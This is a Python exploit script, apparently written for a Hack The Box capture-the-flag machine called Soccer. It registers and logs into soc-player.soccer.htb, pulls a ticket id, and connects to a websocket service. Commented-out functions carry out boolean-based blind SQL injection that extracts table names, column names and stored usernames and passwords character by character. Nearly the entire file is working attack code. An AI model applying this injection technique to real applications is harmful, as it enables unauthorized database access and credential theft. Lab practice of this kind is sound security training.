import requests
import flask

with requests.Session() as session:
    email = "foo@bar.com"
    username = "foo"
    password =  "bar"
    register_data = {"email": email, "username":username, "password":password}
    register_url = "http://soc-player.soccer.htb/signup"
    register = session.post(register_url, data=register_data)

    login_url = "http://soc-player.soccer.htb/login"
    login_data = {"email":email, "password":password}
    login = session.post(login_url, data=login_data, allow_redirects=False)

    # Check / websoc connection?
    check = session.get("http://soc-player.soccer.htb/check")

    import json
    cookiejar = requests.utils.dict_from_cookiejar(session.cookies)
    cookie = ";".join([f"{k}={v}" for k, v in cookiejar.items()])
    
    # Get ticket id
    import re
    ticket_id = re.search(r"(?<=Your Ticket Id: )\d+", check.text).group(0)
    print(ticket_id)

    import websocket
    
    import json
    ticket = json.dumps({'id': f'{ticket_id}'})
    
    ws = websocket.WebSocket()
    ws.connect("ws://soc-player.soccer.htb:9091", cookie=cookie)
    
    #def table_sqli(ticket_id: int, guess: str, table_number: int, character_number: int, op='='):
    #    sqli = f"{ticket_id} and substring((select table_name from information_schema.tables where table_schema=database() limit {table_number},1),{character_number},1) {op} '{guess}'"
    #    return json.dumps({'id': f'{sqli}'})

    #def column_sqli(ticket_id: int, table_name: str, guess: str, column_number: int, character_number: int, op='='):
    #    sqli = f"{ticket_id} and substring((select column_name from information_schema.columns where table_name='{table_name}' limit {column_number},1), {character_number},1) {op} '{guess}'"
    #    return json.dumps({'id': f'{sqli}'})

    #def user_pass_sqli(column_name: str, guess: str, line_number: int, character_number: int, op='='):
    #    sqli = f"{ticket_id} and substring((select {column_name} from accounts limit {line_number},1), {character_number}, 1) {op} '{guess}'"
    #    return json.dumps({'id': f'{sqli}'})

    ## available characters:
    #import string
    #characters = list(string.ascii_letters + string.punctuation)

    #db = {}

    #def enumerate_user_pass(column_name: str):
    #    print(string.printable)
    #    for line_number in range(0,100):
    #        ws.send(user_pass_sqli(column_name=column_name, guess='_', line_number=line_number, character_number=1, op='>='))
    #        if ws.recv() != 'Ticket Exists':
    #            break
    #        username = ''
    #        for character_number in range(1,100):
    #            ws.send(user_pass_sqli(column_name=column_name, guess=' ', line_number=line_number, character_number=character_number, op='>='))
    #            if ws.recv() != 'Ticket Exists':
    #                break
    #            for guess in list(string.printable):
    #                ws.send(user_pass_sqli(column_name=column_name, guess=guess, line_number=line_number, character_number=character_number))
    #                #msg = user_pass_sqli(column_name=column_name, guess=guess, line_number=line_number, character_number=character_number)
    #                #print(msg)
    #                response = ws.recv()
    #                if response == 'Ticket Exists':
    #                    username = username + guess
    #                    print('line', line_number, 'guess:', guess,'username:', username)
    #                    break
    #        print(username)

    #enumerate_user_pass('password')

    #def enumerate_tables():
    #    for table_number in range(0,100):
    #        # Check for any new table names and early term if none exist:
    #        ws.send(table_sqli(ticket_id, 'a', table_number, character_number=1, op='>='))
    #        if ws.recv() != "Ticket Exists":
    #            print('No more tables to enumerate!')
    #            break
    #        table_name = ''
    #        for character_number in range(1,100):
    #            ws.send(table_sqli(ticket_id, 'a', table_number, character_number=character_number, op='>='))
    #            if ws.recv() != "Ticket Exists":
    #                break
    #            for guess in characters:
    #                msg = table_sqli(ticket_id=ticket_id, guess=guess, table_number=table_number, character_number=character_number, op='=')
    #                ws.send(msg)
    #                response = ws.recv()
    #                if response == 'Ticket Exists':
    #                    table_name = table_name + guess
    #                    print(table_name)
    #                    break

    #        db.update({table_name: []})
    #        print('enumerating columns for table: ', table_name)
    #        for column_number in range(0,100):
    #            column_name = ''
    #            # early term
    #            ws.send(column_sqli(ticket_id=ticket_id, guess='a', column_number=column_number, character_number=1, op='>=', table_name=table_name))
    #            if ws.recv() != "Ticket Exists":
    #                print('No more columns to enumerate!')
    #                break

    #            for character_number in range(1,100):
    #                ws.send(column_sqli(ticket_id=ticket_id, guess='_', column_number=column_number, character_number=character_number, op='>=', table_name=table_name))
    #                if ws.recv() != "Ticket Exists":
    #                    print('No more characters to enumerate!')
    #                    break
    #                for guess in characters:
    #                    ws.send(column_sqli(ticket_id=ticket_id, guess=guess, column_number=column_number, character_number=character_number, op='=', table_name=table_name))
    #                    response = ws.recv()
    #                    if response == 'Ticket Exists':
    #                        column_name = column_name + guess
    #                        print(column_name)
    #                        break
    #            db.update({table_name: db.get(table_name) + [column_name]})
    #            print(db)

    #print(db)

    #print('done!')
        
